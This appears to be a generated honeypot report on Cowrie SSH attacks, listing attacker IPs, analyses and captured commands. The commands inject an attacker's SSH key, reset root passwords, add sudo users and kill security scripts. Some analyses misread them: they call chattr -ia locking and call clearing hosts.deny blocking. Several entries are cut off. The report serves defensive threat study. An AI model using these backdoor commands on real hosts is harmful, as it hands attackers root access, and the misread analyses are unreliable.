Gain full root access on the honeypot by injecting an authorized SSH key, changing the root password, and disabling/terminating benign processes to facilitate future exploitation.

**Techniques & Tools Used:**
- **SSH Key Injection** – `echo ... > ~/.ssh/authorized_keys` with a hard‑coded RSA key.
- **Root Password Change** – `echo "root:gI8t9C3lMysx"|chpasswd|bash`.
- **Process Termination** – `pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep`.
- **Permission Modification** – `chmod -R go= ~/.ssh` to restrict access.
- **System Information Gathering** – various `cat /proc/cpuinfo`, `free`, `uname`, etc. (likely reconnaissance).

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.194.199**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password: `gI8t9C3lMysx`

**Threat Level:** **High** – attacker successfully escalated privileges and installed a potential backdoor, posing significant risk to system integrity.

**Brief Summary:**  
The attacker injected an SSH key and changed the root password on the honeypot, effectively gaining full administrative control and likely installing a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:gI8t9C3lMysx"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 65dccf83fcef...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 68.233.116.124

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection combined with basic system reconnaissance.  
**Objective:** Gain remote SSH access (and possibly elevate privileges) while gathering host information for future exploitation.  
**Techniques:**  
- `chattr -ia` and `lockr` to make the `.ssh` directory immutable, preventing deletion.  
- Creation of a new RSA key in `authorized_keys`.  
- Attempts to change user passwords using `passwd` piped with dummy input.  
- System‑info commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **68.233.116.124** (India).  
- RSA key string: `"ssh-rsa

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\n43YlV8GvTDZG\n43YlV8GvTDZG"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\n43YlV8GvTDZG\n43YlV8GvTDZG\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 7774e4601a25...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.69

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Create an SSH access point (by inserting a public key) and attempt to set a known user password.  
**Techniques:**  
- Manipulation of the `~/.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`, `echo … > .ssh/authorized_keys`)  
- Password change attempts via `passwd` (echoed passwords).  
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.217.69**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** Medium – moderate sophistication with potential for remote access and credential compromise.  

**Brief Summary:** The attacker injected an SSH public key into the honeypot’s user directory, attempted to set a known password, and performed basic system reconnaissance, indicating a backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\n1dHVmJ0s7vrg\n1dHVmJ0s7vrg"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\n1dHVmJ0s7vrg\n1dHVmJ0s7vrg\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+10 more)
```

---

### Pattern: a5355d03ddf9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 20.127.224.153

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the system through an injected SSH key.  
**Techniques:**  
- Creation and manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`).  
- Injection of a public RSA key into `authorized_keys`.  
- Setting restrictive permissions (`chmod -R go= ~/.ssh`).  
- Attempting to change the system password via `passwd`.  
- System reconnaissance (CPU info, memory usage, uptime, etc.).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **20.127.224.153**  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  

**Threat Level:** **High** – the attacker has successfully installed a backdoor, enabling remote control and potential data exfiltration.  
**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory to establish persistent remote access, while also gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "user@2025\nIAkrxwGyuKa6\nIAkrxwGyuKa6"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "user@2025\nIAkrxwGyuKa6\nIAkrxwGyuKa6\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a0ddea0e31e4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 51.75.29.236

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain persistent remote access (SSH) and elevate privileges (root password).  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`) to prevent tampering.  
- Injection of a public SSH key into `authorized_keys`.  
- Setting root password via `chpasswd`.  
- System information gathering (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for profiling.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **51.75.29.236** (France)  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- Root password change command: `echo "root:U72fiUebeas2"|chpasswd|bash`  

**Threat Level:** **High** – attacker gains root access and establishes a persistent SSH backdoor, potentially enabling further exploitation.  

**Brief Summary:** The attacker injected an SSH key and changed the root password to create a permanent backdoor while collecting system information for profiling.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:U72fiUebeas2"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 870f8e5fe522...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 161.132.68.222

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain remote access via SSH by adding a malicious key and creating/altering a privileged account.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to hide the `.ssh` directory (process hiding).  
- Writing an SSH public key into `authorized_keys`.  
- Attempting to set password for user “adminuser” (possible credential creation).  
- System‑info commands (`cat /proc/cpuinfo`, `free`, `top`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 161.132.68.222 (Peru)  
- SSH public key string in the authorized_keys file (fingerprint can be extracted).  
- Commands that modify `.ssh` permissions and hide it (`chmod -R go= ~/.ssh`).  

**Threat Level:** Medium – moderate sophistication with potential for remote exploitation.  

**Brief Summary:** The attacker injected a malicious SSH key into the honeypot, attempted to create or alter a privileged user, and collected system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "adminuser\ne40j4eFVNiYv\ne40j4eFVNiYv"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "adminuser\ne40j4eFVNiYv\ne40j4eFVNiYv\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 1e7fc2d424e5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 79.175.151.48

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection and root credential manipulation  
**Objective:** Gain persistent, privileged access to the system for future exploitation or data exfiltration.  

**Techniques Used:**
- **SSH Key Injection** – creation of a new `authorized_keys` file with a hard‑coded RSA key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- **Root Password Change** – `chpasswd` command to set the root password to “MAa54QGTEwkC”.  
- **Process Suppression** – `pkill -9` on various processes (`secure.sh`, `auth.sh`, `sleep`) and clearing `/etc/hosts.deny`.  
- **System Reconnaissance** – commands such as `cat /proc/cpuinfo`, `free -m`, `uname`, `top`, `df -h` to gather hardware and OS details.  

**Indicators of Compromise (IOCs):**
- Attacker IP: **79.175.151.48**  
- Hard‑coded RSA key in `/home/.ssh/authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`  
- Root password hash (or plaintext) “MAa54QGTEwkC”  
- File paths modified: `/home/.ssh`, `/etc/hosts.deny`, `/tmp/secure.sh`, `/tmp/auth.sh`.  

**Threat Level:** **High** – the attacker has established a persistent backdoor with root privileges, enabling potential full system compromise.  

**Brief Summary:** The attacker injected an SSH key and set the root password to gain privileged access, while also suppressing certain processes and gathering system information for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:MAa54QGTEwkC"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 045c1e3a7391...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 179.43.184.242

#### Analysis

**Attack Type:** Backdoor installation / privilege escalation  
**Objective:** Create a privileged account (“system”) for future remote access.  
**Techniques:**  
- `apt update` & `apt install sudo curl -y` – installs necessary tools.  
- `sudo useradd -m -p $(openssl passwd -1 TWsZfa34) system` – creates new user with hashed password.  
- `sudo usermod -aG sudo system` – grants sudo privileges.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **179.43.184.242**  
- Password hash: **openssl passwd -1 TWsZfa34** (hash value not shown)  
**Threat Level:** High – persistent privileged access can lead to full system compromise.  
**Brief Summary:** The attacker quickly installed sudo, created a new user with a hashed password, and added it to the sudo group, establishing a backdoor for future exploitation.

#### Sample Commands
```
apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 TWsZfa34) system &&...
openssl passwd -1 TWsZfa34
openssl passwd -1 TWsZfa34
```

---

### Pattern: 7ca2ea845a56...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 151.47.50.214

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access via SSH (root privileges).  

**Techniques & Tools Used:**  
- **SSH Key Injection** – created `.ssh/authorized_keys` with a hard‑coded RSA key.  
- **Root Password Reset** – changed root password (`chpasswd`).  
- **Process Hiding / Cleanup** – killed suspicious processes and cleared `/tmp`.  
- **System Reconnaissance** – gathered CPU, memory, disk info (e.g., `cat /proc/cpuinfo`, `free -m`, `df -h`).

**Indicators of Compromise (IOCs):**  
- Attacker IP: 151.47.50.214 (Italy)  
- RSA public key in authorized_keys: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password hash (not shown, but `chpasswd` indicates change).  

**Threat Level:** **High** – attacker achieved root access and installed a persistent backdoor.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish a permanent remote control over the system, while also gathering basic system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:oGq2ZHTClzbk"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 85acecb2ff12...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 20.127.224.153

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise (SSH key injection and root password reset).

**2. Objective:**  
Gain persistent remote access to the system by installing a valid SSH key, setting a new root password, and disabling or killing existing security scripts.

**3. Techniques & Tools Used:**
- `chattr`, `lockr` – modify file attributes to prevent tampering.
- `chmod -R go= ~/.ssh` – restrict permissions on SSH directory.
- `echo … > .ssh/authorized_keys` – inject a hard‑coded RSA key.
- `chpasswd | bash` – set root password via the `chpasswd` utility.
- `pkill -9` – terminate security scripts (`secure.sh`, `auth.sh`, `sleep`).
- Various system info commands (e.g., `cat /proc/cpuinfo`, `free`, `top`) for reconnaissance.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **20.127.224.153**
- Hard‑coded RSA public key string in the command.
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.
- Commands that modify permissions and kill processes.

**5. Threat Level:**  
High – attacker is installing a persistent backdoor, resetting root credentials, and disabling security mechanisms.

**6. Brief Summary:**  
The attacker injected an SSH key and reset the root password to establish a persistent remote access point while disabling existing security scripts, indicating a high‑risk backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:SSV1DJKQkLof"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 713d4e02c982...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 79.175.151.48

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (remote access exploitation).

**2. Objective:**  
Gain persistent remote control over the system by adding an authorized SSH key and resetting the root password.

**3. Techniques & Tools Used:**
- `chattr -ia`, `lockr` to lock files.
- `chmod -R go= ~/.ssh` to restrict permissions.
- `echo … > .ssh/authorized_keys` to inject a public RSA key.
- `cat /proc/cpuinfo`, `free`, `top`, `uname`, etc. for system reconnaissance.
- `rm -rf /tmp/...; pkill -9 ...` to kill suspicious processes and hide activity.
- `echo > /etc/hosts.deny` to block certain hosts.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **79.175.151.48**  
- Public SSH key string (RSA fingerprint) embedded in the command.  
- File path: `.ssh/authorized_keys`.  
- Root password set to `YBd2dUDjwbjr` (plain text, not hashed).  

**5. Threat Level:** **High** – The attacker successfully installs a backdoor with root access and modifies system security settings.

**6. Brief Summary:**  
The attacker injected an SSH public key into the system’s authorized keys file, reset the root password, and killed potential monitoring processes to establish a persistent remote backdoor.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:YBd2dUDjwbjr"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 0c3d5fef3302...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 51.75.29.236

#### Analysis

**Attack Type:** Backdoor installation (root credential takeover) with minimal reconnaissance  
**Objective:** Gain persistent privileged access to the honeypot by injecting an SSH key into `authorized_keys` and resetting the root password.  
**Techniques:**  
- `chattr -ia`, `lockr -ia` – lock the `.ssh` directory to prevent tampering.  
- Creation of a new SSH key (`echo … > .ssh/authorized_keys`) and setting permissions (`chmod -R go= ~/.ssh`).  
- Password reset via `chpasswd`.  
- Process cleanup (`pkill`, `rm -rf /tmp/...`) and host denial (`echo > /etc/hosts.deny`).  
- System information gathering (CPU, memory, OS details).  

**Indicators of Compromise (IOCs):**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  
- Root password: `HqBDehMPBogR`.  

**Threat Level:** High – attacker achieved full root access and installed a persistent backdoor.  
**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized_keys, reset the root password to gain privileged access, performed minimal system reconnaissance, and cleaned up temporary scripts, establishing a high‑impact backdoor.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:HqBDehMPBogR"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: e26cf87ab0ca...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 83.229.122.23

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root credential modification)  
**Objective:** Establish persistent remote access to the host for future exploitation.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to make `.ssh` immutable.  
- `echo … > .ssh/authorized_keys` to inject a public SSH key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `chpasswd` to set the root password (`SEMO0yexppkr`).  
- Process cleanup (`rm`, `pkill`) and blocking hosts via `/etc/hosts.deny`.  
- System reconnaissance (CPU, memory, uptime, crontab, etc.).  

**Indicators of Compromise

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:SEMO0yexppkr"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: bd25b1381f7f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 114.80.32.225

#### Analysis

**1. Attack Type**  
Backdoor installation / botnet recruitment – the attacker is setting up remote access via SSH and root credentials.

**2. Objective**  
Gain persistent privileged access to the host (root login) and enable future exploitation or command execution from a remote location.

**3. Techniques & Tools**  
- **SSH key injection**: `echo ... > ~/.ssh/authorized_keys`  
- **Root password reset**: `chpasswd` with known password (`b1CFREtz6Lmj`)  
- **File attribute locking**: `lockr -ia .ssh` (Cowrie‑specific)  
- **Process cleanup & hiding**: `pkill -9 secure.sh`, `pkill -9 auth.sh`, removal of temporary scripts.  
- **System reconnaissance**: CPU, memory, architecture, uptime (`uname`, `top`, `lscpu`, etc.).

**4. Indicators of Compromise (IOCs)**  
- Attacker IP: 114.80.32.225  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:b1CFREtz6Lmj"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 018f4017d1e9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 51.75.29.236

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Create an unauthorized SSH account on the host and gather system information for potential exploitation.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`) to hide or lock it.  
- Injection of a long RSA public key into `authorized_keys`.  
- Setting permissions (`chmod -R go= ~/.ssh`).  
- Attempting to change the user password via `passwd`.  
- System reconnaissance: CPU info, memory usage, file system stats, cron jobs, user identity, architecture details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **51.75.29.236**  
- RSA public key string (the long “ssh‑rsa …” line).  
- File path: `~/.ssh/authorized_keys`  
- Commands: `lockr -ia .ssh`, `chattr -ia .ssh`.  

**Threat Level:** Medium–High – the attacker successfully installed a backdoor and performed reconnaissance, enabling future remote exploitation.  

**Brief Summary:** The attacker injected an SSH key into the host’s authorized keys, attempted to set a new password, and collected system information, indicating a potential backdoor setup for later use.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "user@2025\nzGdtjELwtkqO\nzGdtjELwtkqO"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
